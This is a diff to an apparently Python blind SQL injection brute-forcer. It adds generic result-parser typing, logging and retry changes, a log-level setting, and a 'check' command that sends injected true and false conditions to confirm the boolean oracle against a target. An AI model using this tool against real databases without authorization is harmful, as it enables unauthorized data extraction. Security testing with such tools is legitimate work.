@@ -84,14 +84,16 @@ class SQLPayload:
 class ResultError(RuntimeError): pass
 
 
-class ResultParser:
+T = TypeVar('T')
+
+class ResultParser(Generic[T]):
     @abstractmethod
-    def parse(self, resp) -> Any | ResultError:
+    def parse(self, resp) -> T | ResultError:
         ...
 
 
 @dataclass(kw_only=True)
-class BooleanResultParser(ResultParser):
+class BooleanResultParser(ResultParser[bool]):
     true_if_status: Optional[int] = None
     true_if_not_status: Optional[int] = None
     true_if_text_contains: Optional[str] = None
@@ -157,16 +159,16 @@ class Sender:
     
     retries_on_error: int = 0   # Number of retries if a response was marked as an error.
 
-    result_parser: ResultParser
+    result_parser: ResultParser[bool]
 
-    def send(self, delay: float, delayf: Callable[[float], None], cond: str) -> Any:
+    def send(self, delay: float, delayf: Callable[[float], None], cond: str) -> int | ResultError:
         # sender.send(cond='1=1')
         url, data = self.make_payload(cond=cond)
 
         for attempt in range(self.retries_on_error + 1):
             delayf(delay)
             if attempt == 0:
-                logger.debug(f'requesting...')
+                logger.debug(f'Requesting...')
                 # logger.debug(f' | payload   : {quoted_payload}')
                 logger.debug(f' | url  : {self.url}')
                 logger.debug(f' | data : {self.data}')
@@ -175,7 +177,7 @@ class Sender:
                 else:
                     logger.info(f"cond: {cond}")
 
-            logger.debug(f'attempt #{attempt+1}')
+            logger.debug(f'Attempt #{attempt+1}')
 
             try:
                 resp = self.make_request(url, data)
@@ -184,13 +186,15 @@ class Sender:
             
             result = self.result_parser.parse(resp)
             if isinstance(result, ResultError):
+                logger.info(f'Got error: {result}')
                 if attempt == self.retries_on_error:
                     # This is the LAST. STRAW.
                     raise result
-                logger.info(f'Got error: {result}')
                 logger.info(f'Retrying... ({attempt+1} / {self.retries_on_error+1})')
             else:
                 return result
+        
+        raise ResultError("(unreachable)")
 
     def make_payload(self, cond: str):
         url, data = self.url, self.data
@@ -348,6 +352,9 @@ class SQLStringBrute:
     def mk_delayf(self):
         self.delayf = mk_thread_delay(self.int_evt, self.resume_evt, self.quit_evt, self.on_main_thread_int)
     
+    def send_with_default(self, cond):
+        return self.sender.send(cond=cond, delay=self.delay, delayf=self.delayf)
+
     def reset_evts(self):
         self.int_evt.clear()
         self.resume_evt.clear()
@@ -642,6 +649,39 @@ class Query:
             self.query(sql, info=shorthand.replace('_', ' '))
         else:
             raise NotImplementedError(f"unknown shorthand '{shorthand}' for dbms {self.brute.dbms}")
+        
+    def check(self):
+        ok = True
+        m, n = random.randint(10, 10000), random.randint(10, 10000)
+        try:
+            res = self.brute.send_with_default(cond=f'{n}={n}')
+        except ResultError as e:
+            logging.error(f"Got an error while making the test request: {e}")
+            ok = False
+        else:
+            logging.info(f"--> {res}")
+            if not res:
+                logging.error("Unable to verify TRUE request.")
+                logging.error(f"Sent condition {n}={n}, expected TRUE, but got FALSE.")
+                ok = False
+        
+        if m == n:
+            m -= 1
+        try:
+            res = self.brute.send_with_default(cond=f'{m}={n}')
+        except ResultError as e:
+            logging.error(f"Got an error while making the test request: {e}")
+            ok = False
+        else:
+            logging.info(f"--> {res}")
+            if res:
+                logging.error("Unable to verify FALSE request.")
+                logging.error(f"Sent condition {m}={n}, expected FALSE, but got TRUE.")
+                ok = False
+        
+        if ok:
+            console.log("Checks passed.")
+
 
     def query_table(self, table, col):
         # is_notbased = (id_col.strip() == '')
@@ -904,6 +944,8 @@ def main():
                     table = prompts.table.prompt('table> ')
                     col = prompts.column.prompt('col> ')
                     query.query_table(table, col)
+                case ["check"]:
+                    query.check()
                 case ["c"] | ["conf"] | ["config"]:
                     config_loop(sender, brute)
                 case []:
@@ -933,16 +975,21 @@ def config_loop(sender: Sender, brute: SQLStringBrute, paused_from_task=False) -
     while 1:
         try:
             line = prompts.cfg.prompt("cfg> ")
-            # line = input("cfg> ")
             match line.split():
                 case ['set', 'thread', value]:
                     if paused_from_task:
-                        print("You can't change the number of threads while a task is running.")
+                        console.print("You can't change the number of threads while a task is running.")
                     brute.max_threads = max(int(value), 1)
                 case ['set', 'delay', value]:
                     brute.delay = max(float(value), 0.0)
                 case ['set', 'timeout', value]:
                     sender.timeout = float(value)
+                case ['set', 'loglevel', value]:
+                    if value.upper() not in logging._nameToLevel:
+                        console.print('Unknown log level.')
+                        continue
+
+                    logger.setLevel(logging._nameToLevel[value.upper()])
                 case ['q', *_] | ['quit', *_]:
                     if paused_from_task:
                         if confirm("cancel this operation"):
